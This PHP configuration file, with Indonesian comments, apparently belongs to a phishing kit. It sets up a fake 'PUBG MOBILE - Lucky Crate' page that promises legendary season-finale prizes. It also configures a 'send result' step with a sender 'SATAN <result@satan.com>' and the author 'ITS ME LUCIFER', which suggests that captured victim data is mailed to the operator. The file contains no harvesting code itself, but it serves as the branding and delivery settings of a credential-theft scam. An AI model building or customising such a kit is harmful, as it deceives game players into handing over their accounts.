<?php
// KONTROL UNTUK MENDAPATKAN ZONA WAKTU (JAKARTA)
date_default_timezone_set('Asia/Jakarta');
$jamasuk = date('l, d-m-Y h:i:s');

// KONTROL UNTUK HALAMAN
$title = 'PUBG MOBILE - Lucky Crate';
$description = 'The last week of the season is over. Come join the Royale Pass 13 season finale here. Get a variety of legendary prizes and more!';
$copyright = 'PUBG MOBILE';
$theme = '#f2aa00';
$image = 'https://i.ibb.co/3CSfdjd/season.png';
$icon = 'img/icon.png';

// KONTROL UNTUK HALAMAN KIRIM RESULT
$author = 'ITS ME LUCIFER';
$sender = 'From: SATAN <result@satan.com>';
?>